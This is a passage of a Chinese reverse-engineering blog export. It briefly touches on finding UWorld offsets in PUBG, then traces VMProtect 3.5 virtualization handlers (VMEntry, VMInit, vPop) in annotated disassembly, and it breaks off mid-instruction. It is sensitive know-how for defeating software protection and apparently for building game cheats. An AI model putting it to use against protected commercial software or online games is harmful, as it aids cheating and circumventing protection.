alt=\"document_image_rId31\"></p>\n<h1 id=\"Offset-UWorld\"><a href=\"#Offset-UWorld\" class=\"headerlink\" title=\"Offset_UWorld\"></a>Offset_UWorld</h1><p>随便找一个GetWorldXXXXXX</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId32.png\" alt=\"document_image_rId32\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId33.png\" alt=\"document_image_rId33\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId34.png\" alt=\"document_image_rId34\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId35.png\" alt=\"document_image_rId35\"></p>\n","categories":["UnrealEngine"]},{"title":"VMProtect分析-虚拟化流程","url":"/2023/01/05/VMProtect%E5%88%86%E6%9E%90-%E8%99%9A%E6%8B%9F%E5%8C%96%E6%B5%81%E7%A8%8B/","content":"<h1 id=\"一、没有大炮我们自己造\"><a href=\"#一、没有大炮我们自己造\" class=\"headerlink\" title=\"一、没有大炮我们自己造\"></a>一、没有大炮我们自己造</h1><p>首先编写一个简单的程序。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">\ta = a + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,a);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译后给程序添加vmp保护壳，这里选择的VMP版本为<code>v3.5.0</code>。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E8%99%9A%E6%8B%9F%E5%8C%96%E6%B5%81%E7%A8%8B/image-20230105160101521.png\" alt=\"image-20230105160101521\"></p>\n<p>保护的函数为main函数，编译类型修改为虚拟。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E8%99%9A%E6%8B%9F%E5%8C%96%E6%B5%81%E7%A8%8B/image-20230105160113820.png\" alt=\"image-20230105160113820\"></p>\n<p>并且关闭一系列保护。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E8%99%9A%E6%8B%9F%E5%8C%96%E6%B5%81%E7%A8%8B/image-20230105160125791.png\" alt=\"image-20230105160125791\"></p>\n<p>编译完成后，可看到程序体积有一个翻倍增加。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E8%99%9A%E6%8B%9F%E5%8C%96%E6%B5%81%E7%A8%8B/image-20230105160139363.png\" alt=\"image-20230105160139363\"></p>\n<h1 id=\"二、只能拉一点点\"><a href=\"#二、只能拉一点点\" class=\"headerlink\" title=\"二、只能拉一点点\"></a>二、只能拉一点点</h1><p>首先对原程序的汇编进行一个简单查看，用vs在main函数中打下断点运行后，查看反汇编窗口。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E8%99%9A%E6%8B%9F%E5%8C%96%E6%B5%81%E7%A8%8B/image-20230105160153886.png\" alt=\"image-20230105160153886\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00401040 55                   push        ebp  \t\t\t\t\t\t;ebp=0x19ff74</span><br><span class=\"line\">00401041 8B EC                mov         ebp,esp  \t\t\t\t\t;ebp=0x19FF2C</span><br><span class=\"line\">00401043 51                   push        ecx  \t\t\t\t\t\t;ecx=0x0</span><br><span class=\"line\">00401044 C7 45 FC 01 00 00 00 mov         dword ptr [ebp-4],1  \t\t;ebp-4=0x19FF28\t&#123; int a = 1; &#125;</span><br><span class=\"line\">0040104B 8B 45 FC             mov         eax,dword ptr [ebp-4]  \t;eax=0x1</span><br><span class=\"line\">0040104E 83 C0 01             add         eax,1  \t\t\t\t\t;eax=0x2</span><br><span class=\"line\">00401051 89 45 FC             mov         dword ptr [ebp-4],eax  \t;ebp-4=0x19FF28\t&#123; a = a + 1; &#125;</span><br><span class=\"line\">00401054 8B 4D FC             mov         ecx,dword ptr [ebp-4]  \t;ecx=0x2</span><br><span class=\"line\">00401057 51                   push        ecx  \t\t\t\t\t\t</span><br><span class=\"line\">00401058 68 FC 20 40 00       push        4020FCh  \t\t\t\t\t;&quot;%d\\n&quot;</span><br><span class=\"line\">0040105D E8 0E 00 00 00       call        00401070  \t\t\t\t;&#123; printf(&quot;%d\\n&quot;,a); &#125;</span><br><span class=\"line\">00401062 83 C4 08             add         esp,8  </span><br><span class=\"line\">00401065 33 C0                xor         eax,eax  </span><br><span class=\"line\">00401067 8B E5                mov         esp,ebp  </span><br><span class=\"line\">00401069 5D                   pop         ebp  </span><br><span class=\"line\">0040106A C3                   ret </span><br></pre></td></tr></table></figure>\n\n<p>经过对vmp的分析，可知vmp会将一条代码指令进行拆分后以push和pop命令进行实现，其中push和pop为vmp自实现的函数，这种被vmp自实现用来代替原有指令的函数叫做<code>handler</code>;解密字节码并跳转到对应的handler，这个过程叫做<code>dispatch</code>.例如mov ebp,esp的执行在vmp下会被修改为如下代码：</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E8%99%9A%E6%8B%9F%E5%8C%96%E6%B5%81%E7%A8%8B/image-20230105160206575.png\" alt=\"image-20230105160206575\"></p>\n<p>并且vmp会对通用寄存器有自己的解释。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">EAX:通用寄存器</span><br><span class=\"line\">EDX:通用寄存器</span><br><span class=\"line\">ECX:通用寄存器</span><br><span class=\"line\">EDI:opcode</span><br><span class=\"line\">ESP:虚拟机的栈顶,v_esp</span><br><span class=\"line\">ESI:实际堆栈</span><br><span class=\"line\">EBP:虚拟机的执行地址,v_eip</span><br><span class=\"line\">EBX:滚动key</span><br></pre></td></tr></table></figure>\n\n<p>同时也有定义了自己的寄存器，用来存放一些临时数据。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">vm_context</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R0;\t<span class=\"comment\">//0x00</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R1;\t<span class=\"comment\">//0x04</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R2;\t<span class=\"comment\">//0x08</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R3;\t<span class=\"comment\">//0x0C</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R4;\t<span class=\"comment\">//0x10</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R5;\t<span class=\"comment\">//0x14</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R6;\t<span class=\"comment\">//0x18</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R7;\t<span class=\"comment\">//0x1C</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R8;\t<span class=\"comment\">//0x20</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R9;\t<span class=\"comment\">//0x24</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R10;\t<span class=\"comment\">//0x28</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R11;\t<span class=\"comment\">//0x2C</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R12;\t<span class=\"comment\">//0x30</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R13;\t<span class=\"comment\">//0x34</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R14;\t<span class=\"comment\">//0x38</span></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> R15;\t<span class=\"comment\">//0x3C</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"三、时间会告诉你答案\"><a href=\"#三、时间会告诉你答案\" class=\"headerlink\" title=\"三、时间会告诉你答案\"></a>三、时间会告诉你答案</h1><p>把加了vmp壳的程序拖入OD，能看到属于VMP的入口点。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E8%99%9A%E6%8B%9F%E5%8C%96%E6%B5%81%E7%A8%8B/image-20230105160031408.png\" alt=\"image-20230105160031408\"></p>\n<p>其中push的内容为被加密了的<code>opcode</code>，opcode存放着的是所有的handler地址和一些操作寄存器的数据。</p>\n<h2 id=\"1、指令分析\"><a href=\"#1、指令分析\" class=\"headerlink\" title=\"1、指令分析\"></a>1、指令分析</h2><p>下列所有的代码均为手工取出虚拟化后的代码，并且所有加了v或者v_前缀的内容均值的是vmp自定义的数据。由于vmp在执行函数时会退出虚拟机，函数执行完毕后重新进入虚拟机，因此流程只跟踪到执行printf函数完毕。</p>\n<hr>\n<h3 id=\"VMEntry\"><a href=\"#VMEntry\" class=\"headerlink\" title=\"VMEntry\"></a>VMEntry</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00475751    68 C3365BBC     push 0xBC5B36C3</span><br><span class=\"line\">00475756    E8 BE1FFAFF     call test1_vm.00417719</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"VMInit\"><a href=\"#VMInit\" class=\"headerlink\" title=\"VMInit\"></a>VMInit</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00417719    50              push eax                                 ; 保存堆栈</span><br><span class=\"line\">00417720    51              push ecx</span><br><span class=\"line\">00417721    9C              pushfd</span><br><span class=\"line\">00417724    53              push ebx</span><br><span class=\"line\">00417727    56              push esi</span><br><span class=\"line\">0041772E    57              push edi</span><br><span class=\"line\">00417734    52              push edx</span><br><span class=\"line\">0041773D    55              push ebp</span><br><span class=\"line\">00417742    BA 00000000     mov edx,0x0</span><br><span class=\"line\">00417747    52              push edx</span><br><span class=\"line\">0041774A    8B7C24 28       mov edi,dword ptr ss:[esp+0x28]         ;0xBC5B36C3获取外层push的参数</span><br><span class=\"line\">00417756    4F              dec edi                                 ;开始解密参数</span><br><span class=\"line\">0041775C    81F7 5442907B   xor edi,0x7B904254</span><br><span class=\"line\">0041776F    F7D7            not edi</span><br><span class=\"line\">0041777B    F7DF            neg edi</span><br><span class=\"line\">00417781    F7D7            not edi</span><br><span class=\"line\">0041778A    81EF 98071636   sub edi,0x36160798</span><br><span class=\"line\">00417797    C1CF 03         ror edi,0x3</span><br><span class=\"line\">004177A2    8D3C17          lea edi,dword ptr ds:[edi+edx]\t\t\t;EDI=v_eip,内容以opcode形式存放</span><br><span class=\"line\">004177A5    8BF4            mov esi,esp\t\t\t\t\t\t\t\t;保存原始esp</span><br><span class=\"line\">004177A7    81EC C0000000   sub esp,0xC0\t\t\t\t\t\t\t;开辟新堆栈,vm_context</span><br><span class=\"line\">004177AD    8BDF            mov ebx,edi\t\t\t\t\t\t\t\t;初始化滚动Key</span><br><span class=\"line\">004177B6    B8 00000000     mov eax,0x0</span><br><span class=\"line\">004177C2    2BD8            sub ebx,eax                              </span><br><span class=\"line\">004177CE    8D2D CE774100   lea ebp,dword ptr ds:[0x4177CE]\t\t\t;获取虚拟机代码的起始地址</span><br><span class=\"line\">004177D7    8B17            mov edx,dword ptr ds:[edi]\t\t\t\t;读取opcode</span><br><span class=\"line\">004177DA    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0043DC1F    33D3            xor edx,ebx         \t\t\t\t\t;解密                     </span><br><span class=\"line\">0043DC26    F7DA            neg edx</span><br><span class=\"line\">0043DC29    D1CA            ror edx,1</span><br><span class=\"line\">00469F4B    4A              dec edx</span><br><span class=\"line\">00469F4C    81F2 88622457   xor edx,0x57246288</span><br><span class=\"line\">00469F57    81EA B426A803   sub edx,0x3A826B4</span><br><span class=\"line\">00469F63    0FCA            bswap edx</span><br><span class=\"line\">00469F66    81F2 F21FD256   xor edx,0x56D21FF2</span><br><span class=\"line\">004263AF    C1CA 03         ror edx,0x3</span><br><span class=\"line\">004263B6    33DA            xor ebx,edx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">004263B8    03EA            add ebp,edx\t\t\t\t\t\t\t\t;计算出handler地址</span><br><span class=\"line\">004263BA  ^ FFE5            jmp ebp                                 ;test1_vm.004343B9</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r10\"><a href=\"#vPop-r10\" class=\"headerlink\" title=\"vPop r10\"></a>vPop r10</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004343B9    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;读取原始esp</span><br><span class=\"line\">004343C4    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">004343C7    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节</span><br><span class=\"line\">004343CD    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">004343CF    04 95           add al,0x95</span><br><span class=\"line\">004343D1    F6D8            neg al</span><br><span class=\"line\">0040ACDA    FEC0            inc al</span><br><span class=\"line\">0040ACDE    34 28           xor al,0x28\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0040ACEB    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0040ACEF    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0x28</span><br><span class=\"line\">0040ACF5    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">0040ACF8    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0040AD03    33CB            xor ecx,ebx                         \t;解密读取到的4字节     </span><br><span class=\"line\">0047679A    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">0047679D    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">00448CC5    49              dec ecx</span><br><span class=\"line\">00448CC6    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">00448CCD    8D89 1A29644A   lea ecx,dword ptr ds:[ecx+0x4A64291A]</span><br><span class=\"line\">00448CD3    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00448CDA    03E9            add ebp,ecx</span><br><span class=\"line\">00449A6E    55              push ebp                                ;压栈下一个handler地址后跳转</span><br><span class=\"line\">00449A6F    C3              retn\t\t\t\t\t\t\t\t\t;0x46FF2C</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r12\"><a href=\"#vPop-r12\" class=\"headerlink\" title=\"vPop r12\"></a>vPop r12</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0046FF2C    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;读取原始esp</span><br><span class=\"line\">0046FF2E    8DB6 04000000   lea esi,dword ptr ds:[esi+0x4]\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">0046FF37    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">0046FF3A    8DBF 01000000   lea edi,dword ptr ds:[edi+0x1]\t\t\t;跳过读取的字节</span><br><span class=\"line\">0046FF48    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0046FF53    04 95           add al,0x95</span><br><span class=\"line\">00446B15    F6D8            neg al</span><br><span class=\"line\">00454B5C    FEC0            inc al</span><br><span class=\"line\">00454B61    34 28           xor al,0x28\t\t\t\t\t\t\t\t</span><br><span class=\"line\">00454B64    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00454B66    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0x30</span><br><span class=\"line\">00454B6C    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">00454B72    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">00454B7A    33CB            xor ecx,ebx                             ;解密读取到的4字节 </span><br><span class=\"line\">00454B7C    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">00454B7F    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">00422059    49              dec ecx</span><br><span class=\"line\">0042205D    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">00422065    8D89 1A29644A   lea ecx,dword ptr ds:[ecx+0x4A64291A]</span><br><span class=\"line\">0042206B    33D9            xor ebx,ecx</span><br><span class=\"line\">0042206D    03E9            add ebp,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00409147   /FFE5            jmp ebp                                 ;0x00453841</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r8\"><a href=\"#vPop-r8\" class=\"headerlink\" title=\"vPop r8\"></a>vPop r8</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00453841    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;读取原始esp</span><br><span class=\"line\">00453846    81C6 04000000   add esi,0x4\t\t\t\t\t\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">00453854    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">00453857    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节</span><br><span class=\"line\">00453866    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0045386E    04 95           add al,0x95</span><br><span class=\"line\">00453870    F6D8            neg al</span><br><span class=\"line\">00458E65    FEC0            inc al</span><br><span class=\"line\">00458E6B    34 28           xor al,0x28</span><br><span class=\"line\">00458E6D    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00458E6F    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0x20</span><br><span class=\"line\">00458E7C    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">00479B0C    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0041B623    33CB            xor ecx,ebx</span><br><span class=\"line\">00470224    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">00470227    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">004452FB    49              dec ecx</span><br><span class=\"line\">004452FC    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">00445305    81C1 1A29644A   add ecx,0x4A64291A</span><br><span class=\"line\">0044530B    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0044530D    03E9            add ebp,ecx\t</span><br><span class=\"line\">0043AD66    55              push ebp                                 </span><br><span class=\"line\">0043AD67    C3              retn\t\t\t\t\t\t\t\t\t;0x00430521</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r6\"><a href=\"#vPop-r6\" class=\"headerlink\" title=\"vPop r6\"></a>vPop r6</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00430521    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;读取原始esp</span><br><span class=\"line\">00430523    81C6 04000000   add esi,0x4\t\t\t\t\t\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">00430529    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">004552EE    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节</span><br><span class=\"line\">004552F4    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">004552F9    04 95           add al,0x95</span><br><span class=\"line\">004552FB    F6D8            neg al</span><br><span class=\"line\">004552FD    FEC0            inc al</span><br><span class=\"line\">00455303    34 28           xor al,0x28</span><br><span class=\"line\">00455309    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0045530C    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0x18</span><br><span class=\"line\">00455311    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">00455313    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0045531F    33CB            xor ecx,ebx                             </span><br><span class=\"line\">00455324    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">0045532B    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">00455331    49              dec ecx</span><br><span class=\"line\">00455332    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">00455339    81C1 1A29644A   add ecx,0x4A64291A</span><br><span class=\"line\">00455345    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00455347    03E9            add ebp,ecx</span><br><span class=\"line\">004781EB  ^\\FFE5            jmp ebp                                 ;0x0043BD4C</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r3\"><a href=\"#vPop-r3\" class=\"headerlink\" title=\"vPop r3\"></a>vPop r3</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0043BD4C    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;读取原始esp</span><br><span class=\"line\">0043BD55    81C6 04000000   add esi,0x4\t\t\t\t\t\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">0043BD5B    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">0043BD66    8DBF 01000000   lea edi,dword ptr ds:[edi+0x1]\t\t\t;跳过读取的字节</span><br><span class=\"line\">0043BD72    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0043BD74    04 95           add al,0x95</span><br><span class=\"line\">0043BD7A    F6D8            neg al</span><br><span class=\"line\">00479730    FEC0            inc al</span><br><span class=\"line\">00424206    34 28           xor al,0x28</span><br><span class=\"line\">00424208    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0042420C    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0xC</span><br><span class=\"line\">0042420F    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">00424211    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">00424217    33CB            xor ecx,ebx                            </span><br><span class=\"line\">0043796F    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">0041F44A    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">004104C7    49              dec ecx</span><br><span class=\"line\">004104C8    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">004104CE    8D89 1A29644A   lea ecx,dword ptr ds:[ecx+0x4A64291A]</span><br><span class=\"line\">004104D5    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">004104D7    03E9            add ebp,ecx</span><br><span class=\"line\">004536AD    55              push ebp                               </span><br><span class=\"line\">004536AE    C3              retn\t\t\t\t\t\t\t\t\t;0x0045E179</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r5\"><a href=\"#vPop-r5\" class=\"headerlink\" title=\"vPop r5\"></a>vPop r5</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0045E179    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;读取原始esp</span><br><span class=\"line\">0045E181    8DB6 04000000   lea esi,dword ptr ds:[esi+0x4]\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">0045E187    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">0045E18A    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节</span><br><span class=\"line\">0045E193    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0045E197    04 95           add al,0x95</span><br><span class=\"line\">0045E199    F6D8            neg al</span><br><span class=\"line\">0047C824    FEC0            inc al</span><br><span class=\"line\">00459FC2    34 28           xor al,0x28</span><br><span class=\"line\">00459FC8    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00459FCC    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0x14</span><br><span class=\"line\">00459FCF    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">00459FD1    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">00459FD7    33CB            xor ecx,ebx                             </span><br><span class=\"line\">00459FD9    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">00459FDC    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">00459FE2    49              dec ecx</span><br><span class=\"line\">00459FE3    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">00459FEE    81C1 1A29644A   add ecx,0x4A64291A</span><br><span class=\"line\">00459FF4    33D9            xor ebx,ecx</span><br><span class=\"line\">00459FF6    03E9            add ebp,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00479CA7  ^\\FFE5            jmp ebp                                 ;0x0046D3FB</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r9\"><a href=\"#vPop-r9\" class=\"headerlink\" title=\"vPop r9\"></a>vPop r9</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0046D3FB    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;读取原始esp</span><br><span class=\"line\">0046D3FD    81C6 04000000   add esi,0x4\t\t\t\t\t\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">0046D403    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">0046D407    8DBF 01000000   lea edi,dword ptr ds:[edi+0x1]\t\t\t;跳过读取的字节</span><br><span class=\"line\">0046D413    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0046D415    04 95           add al,0x95</span><br><span class=\"line\">0046D41B    F6D8            neg al</span><br><span class=\"line\">004264F7    FEC0            inc al</span><br><span class=\"line\">004264F9    34 28           xor al,0x28</span><br><span class=\"line\">004264FC    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00426500    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0x24</span><br><span class=\"line\">00426503    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">00426508    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0042650F    33CB            xor ecx,ebx                             </span><br><span class=\"line\">00426512    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">0047CDC0    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">00483DE1    49              dec ecx</span><br><span class=\"line\">00483DE8    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">00483DF9    8D89 1A29644A   lea ecx,dword ptr ds:[ecx+0x4A64291A]</span><br><span class=\"line\">00483E02    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00483E0B    03E9            add ebp,ecx</span><br><span class=\"line\">0047FFF9  ^\\FFE5            jmp ebp                                 ;0x0046C4CB</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r2\"><a href=\"#vPop-r2\" class=\"headerlink\" title=\"vPop r2\"></a>vPop r2</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0046C4CB    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;读取原始esp</span><br><span class=\"line\">0046C4CD    8DB6 04000000   lea esi,dword ptr ds:[esi+0x4]\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">0046C4D7    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">0046C4DD    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节</span><br><span class=\"line\">0046C4E3    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0046C4EA    04 95           add al,0x95</span><br><span class=\"line\">00445326    F6D8            neg al</span><br><span class=\"line\">00445328    FEC0    